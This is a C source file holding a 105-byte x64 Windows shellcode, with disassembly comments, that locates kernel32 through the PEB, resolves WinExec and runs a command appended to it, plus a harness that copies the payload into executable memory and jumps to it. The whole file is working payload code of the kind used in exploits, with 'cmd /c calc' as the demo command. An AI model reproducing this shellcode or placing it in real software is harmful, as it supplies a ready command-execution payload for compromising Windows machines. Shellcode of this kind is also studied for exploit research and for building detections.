
#include <windows.h>
#include <stdio.h>

#define MAX_CMD_LEN 255

/* Copyright (c) 2014 Kevin Devine */
/* Size = 105 bytes */

char exec64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                           */
  /* 0001 */  "\x56"                          /*  push rsi                           */
  /* 0002 */  "\x57"                          /*  push rdi                           */
  /* 0003 */  "\x55"                          /*  push rbp                           */
  /* 0004 */  "\x48\x83\xEC\x48"              /*  sub rsp, 48h                       */
  /* 0008 */  "\xEB\x5A"                      /*  jmp 00000064h                      */
  /* 000A */  "\x6A\x60"                      /*  push 00000060h                     */
  /* 000C */  "\x59"                          /*  pop rcx                            */
  /* 000D */  "\x65\x48\x8B\x31"              /*  mov rsi, qword ptr [rcx]           */
  /* 0011 */  "\x48\x8B\x76\x18"              /*  mov rsi, qword ptr [rsi+18h]       */
  /* 0015 */  "\x48\x8B\x76\x10"              /*  mov rsi, qword ptr [rsi+10h]       */
  /* 0019 */  "\x48\xAD"                      /*  lodsq                              */
  /* 001B */  "\x48\x8B\x30"                  /*  mov rsi, qword ptr [rax]           */
  /* 001E */  "\x48\x8B\x7E\x30"              /*  mov rdi, qword ptr [rsi+30h]       */
  /* 0022 */  "\x03\x4F\x3C"                  /*  add ecx, dword ptr [rdi+3Ch]       */
  /* 0025 */  "\x8B\x5C\x39\x28"              /*  mov ebx, dword ptr [rcx+rdi+28h]   */
  /* 0029 */  "\x8B\x74\x3B\x20"              /*  mov esi, dword ptr [rbx+rdi+20h]   */
  /* 002D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0030 */  "\x8B\x4C\x3B\x24"              /*  mov ecx, dword ptr [rbx+rdi+24h]   */
  /* 0034 */  "\x48\x03\xCF"                  /*  add rcx, rdi                       */
  /* 0037 */  "\x33\xD2"                      /*  xor edx, edx                       */
  /* 0039 */  "\x0F\xB7\x2C\x51"              /*  movzx ebp, word ptr [rcx+rdx*2]    */
  /* 003D */  "\xFF\xC2"                      /*  inc edx                            */
  /* 003F */  "\xAD"                          /*  lodsd                              */
  /* 0040 */  "\x81\x3C\x38\x57\x69\x6E\x45"  /*  cmp dword ptr [rax+rdi], 456E6957h */
  /* 0047 */  "\x75\xF0"                      /*  jne 00000039h                      */
  /* 0049 */  "\x8B\x74\x3B\x1C"              /*  mov esi, dword ptr [rbx+rdi+1Ch]   */
  /* 004D */  "\x48\x03\xF7"                  /*  add rsi, rdi                       */
  /* 0050 */  "\x8B\x04\xAE"                  /*  mov eax, dword ptr [rsi+rbp*4]     */
  /* 0053 */  "\x48\x03\xC7"                  /*  add rax, rdi                       */
  /* 0056 */  "\x33\xD2"                      /*  xor edx, edx                       */
  /* 0058 */  "\x59"                          /*  pop rcx                            */
  /* 0059 */  "\xFF\xD0"                      /*  call rax                           */
  /* 005B */  "\x48\x83\xC4\x48"              /*  add rsp, 48h                       */
  /* 005F */  "\x5D"                          /*  pop rbp                            */
  /* 0060 */  "\x5F"                          /*  pop rdi                            */
  /* 0061 */  "\x5E"                          /*  pop rsi                            */
  /* 0062 */  "\x5B"                          /*  pop rbx                            */
  /* 0063 */  "\xC3"                          /*  ret                                */
  /* 0064 */  "\xE8\xA1\xFF\xFF\xFF"          /*  call 0000000Ah                     */
};

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
    
  if (argc != 2) {
    printf ("\nUsage: exec64_test <255-byte command>");
    printf ("\nExample: exec64_test \"cmd /c calc\"\n");
    return 0;
  }
  
  char *cmd = argv[1];
  size_t cmd_len = strlen (cmd);
  
  if (cmd_len > MAX_CMD_LEN) {
    printf ("\nCommand exceeds WinExec() limit of %i bytes", MAX_CMD_LEN);
    return 0;
  }
  
  void *exec = VirtualAlloc(0, strlen (exec64) + MAX_CMD_LEN + 1, 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, exec64, strlen (exec64));
  strcat ((char*)exec, cmd);
  printf ("\nAssembly : %i\nFinal Size : %i", 
    strlen (exec64), 
    cmd_len + strlen (exec64));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  return 0;
}

